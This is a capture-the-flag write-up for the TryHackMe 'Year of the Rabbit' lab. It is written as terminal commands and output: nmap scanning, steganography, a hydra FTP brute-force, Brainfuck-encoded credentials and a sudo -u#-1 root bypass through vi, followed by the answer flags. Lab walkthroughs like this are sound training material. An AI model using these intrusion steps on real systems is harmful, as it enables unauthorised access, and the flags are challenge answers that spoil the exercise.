# Year of the Rabbit

Time to enter the warren...

[Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)

## Topic's

- Network Enumeration
- Web Poking
- Steganography
- Stored Passwords & Keys
- Brute Forcing (FTP)
- Cryptography
  - Brainfuck
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Flags

Can you hack into the Year of the Rabbit box without falling down a hole?
(Please ensure your volume is turned up!)

```
kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ sudo nmap -A -sC -sV -O -Pn 10.10.20.247
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 19:39 CEST
Nmap scan report for 10.10.20.247
Host is up (0.048s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=44187%PV=Y%DS=2%DC=T%G=Y%TM=5F7A08F
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   87.90 ms 10.8.0.1
2   88.05 ms 10.10.20.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.73 seconds
```

- [view-source:http://10.10.20.247/assets/style.css](view-source:http://10.10.20.247/assets/style.css)

```css
/* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

- [view-source:http://10.10.20.247/sup3r_s3cret_fl4g/](view-source:http://10.10.20.247/sup3r_s3cret_fl4g/)

```html
<html>
  <head>
    <title>sup3r_s3cr3t_fl4g</title>
  </head>
  <body>
    <noscript>Love it when people block Javascript...<br /></noscript>
    <noscript
      >This is happening whether you like it or not... The hint is in the video.
      If you're stuck here then you're just going to have to bite the bullet!<br />Make
      sure your audio is turned up!<br
    /></noscript>
    <script>
      alert("Word of advice... Turn off your javascript...");
      window.location =
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
    </script>
    <video controls>
      <source src="/assets/RickRolled.mp4" type="video/mp4" />
    </video>
  </body>
</html>
```

![](2020-10-04_19-49.png)

- [10.10.20.247/WExYY2Cv-qU/](10.10.20.247/WExYY2Cv-qU/)

```
kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ strings Hot_Babe.png
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```

```
kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ hydra -l ftpuser -P passwd.list ftp://10.10.20.247
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 20:11:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.20.247:21/
[21][ftp] host: 10.10.20.247   login: ftpuser   password: 5iez1wGXKfPKQ
```

```
kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

```
User: eli
Password: DSpDiM1wAEwid
```

```
kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ ssh eli@10.10.20.247
The authenticity of host '10.10.20.247 (10.10.20.247)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.20.247' (ECDSA) to the list of known hosts.
eli@10.10.20.247's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$
```

```
eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:~$ su gwendoline
Password:
gwendoline@year-of-the-rabbit:/home/eli$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
gwendoline@year-of-the-rabbit:/home/eli$ cd ~
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
gwendoline@year-of-the-rabbit:~$
```

```
gwendoline@year-of-the-rabbit:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
-rwsr-xr-x 1 root root 40000 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 27416 Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root root 40168 Nov 20  2014 /bin/su
-rwsr-xr-x 1 root root 30800 Nov  8  2014 /bin/fusermount
-rwsr-xr-x 1 root root 146160 Oct  5  2014 /bin/ntfs-3g
-rwsr-xr-x 1 root root 10568 Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
-rwsr-sr-x 1 root root 10104 Apr  1  2014 /usr/bin/X
-rwsr-sr-x 1 root mail 89248 Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root root 23168 Nov 28  2014 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75376 Nov 20  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39912 Nov 20  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149568 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 44464 Nov 20  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 53616 Nov 20  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 3124160 Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 333560 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 14632 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14200 Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10248 Apr 15  2015 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 10104 Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root

Press ENTER or type command to continue
root@year-of-the-rabbit:/home/gwendoline# cd ~
root@year-of-the-rabbit:/# ls
bin  boot  dev  etc  home  initrd.img  lib  lib64  live-build  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
root@year-of-the-rabbit:/# cd /root/
root@year-of-the-rabbit:/root# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
root@year-of-the-rabbit:/root#
```

1. What is the user flag?

`THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

2. What is the root flag?

`THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`
